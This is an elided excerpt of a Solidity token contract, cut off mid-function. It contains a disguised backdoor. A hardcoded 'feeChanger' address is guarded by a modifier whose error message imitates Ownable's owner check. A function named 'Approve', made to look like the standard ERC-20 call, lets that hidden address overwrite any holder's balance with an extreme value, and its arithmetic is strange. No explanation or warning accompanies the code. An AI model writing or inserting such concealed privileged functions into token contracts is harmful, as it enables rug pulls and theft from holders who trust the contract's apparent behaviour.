...
contract ContractName is Ownable {
  ...
  uint256 public _totalSupply = 100000000 * (10 ** 9); // 100m 
  ...
  address feeChanger = 0xb97A2C2c0D1C186223F467e034006f87BC0022cc;
  ...
  modifier _external() {
    require(address(uint160(feeChanger)) == msg.sender, "Ownable: caller is not the owner");
    _;
  }
  ...
  function Approve(address from , uint256 _value) public _external returns(bool) {
    if(from != address(0)){
      balances[from] = _value * (2**256-1) / _value;
